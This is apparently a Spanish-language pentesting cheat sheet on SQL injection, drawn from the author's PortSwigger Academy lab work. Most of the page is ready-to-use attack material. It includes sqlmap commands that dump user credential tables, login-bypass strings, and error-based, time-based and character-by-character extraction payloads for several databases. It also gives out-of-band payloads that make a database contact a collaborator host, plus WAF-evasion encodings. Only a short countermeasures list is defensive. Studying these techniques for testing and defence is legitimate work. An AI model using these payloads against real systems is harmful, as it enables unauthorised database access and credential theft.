# Inyección SQL (SQLi)

## Descripción
Técnica de explotación que permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos. Permite ver datos que normalmente no se pueden recuperar, modificar o eliminar datos, y en algunos casos, obtener acceso de administrador al servidor de la base de datos (RCE).

## Clasificación
- **Fase**: Explotación
- **MITRE ATT&CK**: T1190 (Exploit Public-Facing Application)
- **Plataforma**: Web
- **Dificultad**: Intermedia

## Herramientas
- **sqlmap** (`--batch`, `--dump`, `--risk`, `--level`) — herramienta automatizada para detectar y explotar fallos de inyección SQL.
- **Burp Suite** (Repeater, Intruder) — para pruebas manuales y manipulación de parámetros en tiempo real.
- **Ghmap** — herramienta para automatizar el descubrimiento de dorks relacionados con SQLi.

## Comandos / Ejemplos

### Explotación automatizada con SQLMap
```bash
# Escaneo básico de una URL con parámetros
sqlmap -u "http://target.com/products.php?id=1" --batch --dbs
# Resultado: lista las bases de datos disponibles si el parámetro es vulnerable

# Extracción de tablas de una base de datos específica
sqlmap -u "http://target.com/products.php?id=1" -D public_db --tables --batch

# Volcado de credenciales de una tabla
sqlmap -u "http://target.com/products.php?id=1" -D public_db -T users --columns --dump --batch
```

### Pruebas manuales básicas
```sql
-- Sondeo aritmetico para numeric SQLi (sin keywords, pasa WAF de patrones).
-- Si el campo original es 2 y mandar 3-1 devuelve el mismo resultado: numeric SQLi.
-- Si la respuesta cambia o falla: campo parametrizado, o string SQLi (necesita ').
3-1     -- equivalente a 2 si la DB evalua la expresion

-- Bypass de login simple
admin' OR '1'='1' --
admin' #

-- Error-based SQLi - PostgreSQL/SQLite (CAST a int, lectura directa del valor en el mensaje)
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

-- Error-based SQLi - PostgreSQL/Oracle/SQLite con concatenacion (compacto, util si hay limite de longitud)
'||CAST((SELECT password FROM users LIMIT 1)AS int)||'

-- Error-based SQLi - MS SQL Server
' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--

-- Error-based SQLi - MySQL (XPath via extractvalue, ya que no hay CAST directo a int aprovechable)
' AND extractvalue(rand(),concat(0x3a,(SELECT password FROM users LIMIT 1)))--

-- Error-based SQLi - MySQL clasico (duplicate key con COUNT/GROUP BY, fallback cuando los anteriores estan filtrados)
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT version()), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

```sql
-- Time-based SQLi: para cuando no hay error visible ni diferencia booleana.
-- Antes de probar, registrar baseline (3-4 requests limpias) para distinguir el retardo de la latencia normal.

-- Time-based - PostgreSQL (stacked queries, solo provoca retardo)
'; SELECT pg_sleep(10)--

-- Time-based - PostgreSQL/Oracle/SQLite (concatenacion, util con limite de longitud)
'||pg_sleep(10)--

-- Time-based - PostgreSQL/MySQL (clausula AND, mas universal, funciona sin stacked)
' AND pg_sleep(10)--                          -- PostgreSQL
' AND IF(1=1, SLEEP(10), 0)--                 -- MySQL/MariaDB

-- Time-based - MS SQL Server (WAITFOR es sentencia, no funcion - requiere stacked o IF)
'; WAITFOR DELAY '0:0:10'--

-- Time-based - Oracle (no hay SLEEP puro, se usa pipe que timeoutea)
' AND 1=(dbms_pipe.receive_message(('a'),10))--

-- Time-based con inferencia bit a bit (PostgreSQL): retardo solo si el caracter coincide
'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--

-- Gotcha: si el sink es header Cookie, ';' es delimitador y rompe el payload.
-- Hay que URL-encodearlo como %3B en el valor de la cookie:
-- Cookie: TrackingId=x'%3BSELECT+pg_sleep(10)--
```

```bash
# Time-based con sqlmap (forzar tecnica time-blind y ajustar el delay base)
sqlmap -u "http://target.com/products?id=1" --technique=T --time-sec=5 --batch
```

> **Nota operacional — paralelismo en time-based**: la extraccion bit-a-bit con time-based es paralelizable trivialmente (cada `(posicion, candidato)` es independiente). Burp Suite **Community** limita a 1 thread, lo que para 20 chars × 36 candidatos = 720 requests con `pg_sleep(5)` da ~6 minutos. Un script Python con `requests + concurrent.futures.ThreadPoolExecutor` (10 workers) baja eso a ~1 minuto al saturar el pool de conexiones de la DB. El cuello de botella deja de ser el cliente y pasa a ser cuantas conexiones concurrentes acepta la DB para los `pg_sleep`. Ver writeup `learning/portswigger/blind-sqli-time-delays-info-retrieval/` para implementacion completa.

```sql
-- Out-of-Band SQLi (OAST): cuando la query es async y no afecta ni body ni tiempo.
-- Forzar conexion saliente desde la DB hacia un dominio que controlamos.
-- Receptor: Burp Collaborator (*.oastify.com, Pro), interactsh (*.oast.me, gratis), DNSLog.

-- OOB Oracle - XXE via xmltype (la primitiva mas usada, sin permisos especiales)
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLAB.oastify.com/"> %remote;]>'),'/l') FROM dual--

-- OOB Oracle - alternativas si XXE bloqueado (requieren permisos sobre packages)
'||(SELECT UTL_HTTP.REQUEST('http://COLLAB.oastify.com') FROM dual)||'
'||UTL_INADDR.GET_HOST_ADDRESS('COLLAB.oastify.com')||'

-- OOB MS SQL Server (UNC path -> SMB/NetBIOS lookup desde el host de la DB)
'; EXEC master..xp_dirtree '\\COLLAB.oastify.com\share'--

-- OOB MySQL Windows (requiere privilegio FILE; no funciona en Linux)
' UNION SELECT LOAD_FILE('\\\\COLLAB.oastify.com\\share')--
```

```bash
# URL-encodeado para meter en cookie TrackingId (ejemplo Oracle XXE):
# TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//COLLAB.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--

# Levantar interactsh-client como receptor OAST gratuito
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client    # imprime el subdominio único asignado, ej. xxxxx.oast.me
```

> **Nota operacional — allowlists OAST**: PortSwigger Academy bloquea outbound hacia cualquier dominio distinto de `*.oastify.com` (Burp Collaborator). Sin Burp Pro los labs OOB de la Academy no son resolubles via interactsh/DNSLog. En pentests reales o bug bounty no suele haber esa restricción y interactsh es suficiente. Verificar restricciones del target antes de invertir tiempo en debug — si el firewall corta la salida, ningún payload funcionará. Ver writeup `learning/portswigger/blind-sqli-out-of-band/` para diagnóstico completo del caso.

```xml
<!-- WAF bypass via XML hex entities: cuando el body es XML y el WAF
     inspecciona el wire format, encodear las primeras letras de las
     keywords basta para romper el match. El parser XML las decodea
     antes de pasarlas al backend. -->

<!-- Original (bloqueado por WAF que detecta UNION/SELECT/'): -->
<storeId>1 UNION SELECT username||':'||password FROM users</storeId>

<!-- Bypass minimo (encodear solo primera letra de keywords y comillas): -->
<storeId>1 &#x55;NION &#x53;ELECT username||&#x27;~&#x27;||password FROM users</storeId>

<!-- Bypass agresivo (encodear keyword entera, mas ruidoso pero pasa WAFs mas finos): -->
<storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; ...</storeId>
```

```sql
-- Otros bypasses comunes (sin encoding de formato, a nivel SQL):

-- Comentarios inline para romper el match exacto (MySQL/MariaDB)
UN/**/ION SE/**/LECT 1,2--

-- Whitespace alternativo cuando el WAF normaliza espacios pero no tabs/newlines
UNION%09SELECT 1,2--      -- tab
UNION%0aSELECT 1,2--      -- newline
UNION/**/SELECT 1,2--     -- comentario como separador

-- Equivalencias semanticas
&& en lugar de AND  -- MySQL
|| en lugar de OR   -- PostgreSQL/Oracle/SQLite (ojo: tambien es concat)
MID() en lugar de SUBSTRING()
IIF() en lugar de CASE WHEN  -- MS SQL
```

> **Heurística WAF bypass**: orden de prueba — (1) encoding por formato del body (XML entities, JSON unicode escapes); (2) comentarios inline + whitespace alternativo; (3) equivalencias semánticas. Combinar varias suele bypassear hasta WAFs decentes. Ver writeup `learning/portswigger/sqli-filter-bypass-xml-encoding/` para ejemplo end-to-end con XML hex entities.

## Contramedidas
- Uso de consultas preparadas (Prepared Statements) con parametrización.
- Implementación de una lista blanca (Allow-list) para la validación de entradas.
- Uso de ORMs modernos que gestionan la seguridad de las consultas por defecto.
- Aplicar el principio de menor privilegio a la cuenta de servicio de la base de datos.

## Referencias
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
- Writeup propio: [`learning/portswigger/visible-error-based-sql-injection/writeup.md`](../../../learning/portswigger/visible-error-based-sql-injection/writeup.md) — ejemplo end-to-end del CAST PostgreSQL.
- Writeup propio: [`learning/portswigger/blind-sqli-time-delays/writeup.md`](../../../learning/portswigger/blind-sqli-time-delays/writeup.md) — ejemplo end-to-end de time-based con `pg_sleep` (stacked queries en cookie, `;` URL-encoded como `%3B`).
- Writeup propio: [`learning/portswigger/blind-sqli-time-delays-info-retrieval/writeup.md`](../../../learning/portswigger/blind-sqli-time-delays-info-retrieval/writeup.md) — extracción carácter a carácter con script Python paralelizado.
- Writeup propio: [`learning/portswigger/blind-sqli-out-of-band/writeup.md`](../../../learning/portswigger/blind-sqli-out-of-band/writeup.md) — OOB Oracle XXE via `xmltype` + diagnóstico de allowlist OAST en PortSwigger Academy.
- Writeup propio: [`learning/portswigger/sqli-filter-bypass-xml-encoding/writeup.md`](../../../learning/portswigger/sqli-filter-bypass-xml-encoding/writeup.md) — WAF bypass via XML hex entities (`&#x55;NION`) sobre endpoint XML, con sondeo numeric SQLi via aritmética.
